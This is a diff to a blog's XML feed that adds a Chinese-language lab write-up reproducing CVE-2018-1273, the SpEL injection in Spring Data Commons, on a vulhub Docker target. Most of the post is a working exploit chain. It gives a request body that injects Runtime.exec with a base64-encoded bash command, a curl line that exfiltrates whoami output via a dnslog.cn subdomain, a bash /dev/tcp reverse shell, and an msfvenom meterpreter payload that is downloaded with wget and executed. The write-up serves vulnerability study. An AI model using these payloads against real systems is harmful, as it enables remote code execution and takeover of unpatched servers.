@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</title>
+      <link href="/2022/05/07/Spring-Data-Commons/"/>
+      <url>/2022/05/07/Spring-Data-Commons/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Spring-Data-Commons远程命令执行漏洞"><a href="#Spring-Data-Commons远程命令执行漏洞" class="headerlink" title="Spring Data Commons远程命令执行漏洞"></a>Spring Data Commons远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</p><p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p><p>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</p><p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2018-1273docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>首先打开<code>http://192.168.3.151:8080/users</code></p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507103406340.png" alt="image-20220507103406340"></p><p>输入参数抓包</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507103644231.png" alt="image-20220507103644231"></p><p>先打开<a href="http://dnslog.cn/">dnslog</a>，随机搞一个dns</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507104638615.png" alt="image-20220507104638615"></p><p>构造语句</p><pre class=" language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.83axbz.dnslog.cn</code></pre><p>扔进<a href="https://x.hacking8.com/?post=293">base64编码</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC44M2F4YnouZG5zbG9nLmNu&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105039963.png" alt="image-20220507105039963"></p><p>把这个命令扔进数据包里</p><pre><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC44M2F4YnouZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=a&amp;repeatedPassword=a</code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105159038.png" alt="image-20220507105159038"></p><p>看一下dnslog</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105211647.png" alt="image-20220507105211647"></p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>再base64编码一下</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105449493.png" alt="image-20220507105449493"></p><p>设置监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>把数据包发出去</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105636857.png" alt="image-20220507105636857"></p><p>不知道为啥反弹不过来，换一种方法</p><p>先用<code>msfvenom</code>构造一个payload</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f elf > /root/shell.elf</code></pre><p>打开<code>msfconsole</code></p><pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.3.134run</code></pre><p>开启http</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>然后构造上传命令</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/shell.elf</code></pre><p>扔进数据包里上传</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111530996.png" alt="image-20220507111530996"></p><p>上传成功</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111548952.png" alt="image-20220507111548952"></p><p>修改权限然后运行</p><pre class=" language-Linux"><code class="language-Linux">chmod 777 ./shell.elf./shell.elf</code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111735854.png" alt="image-20220507111735854"></p><p>成功回弹成功！</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111823424.png" alt="image-20220507111823424"></p><p>结束！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> Spring </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Spring-Messaging远程命令执行漏洞(CVE-2018-1270)</title>
       <link href="/2022/05/07/Spring-Messaging/"/>
       <url>/2022/05/07/Spring-Messaging/</url>
@@ -2011,9 +2046,9 @@
             
             <tag> 网络安全 </tag>
             
-            <tag> 漏洞 </tag>
-            
             <tag> PHP </tag>
+            
+            <tag> 漏洞 </tag>
             
             <tag> sql注入 </tag>
             
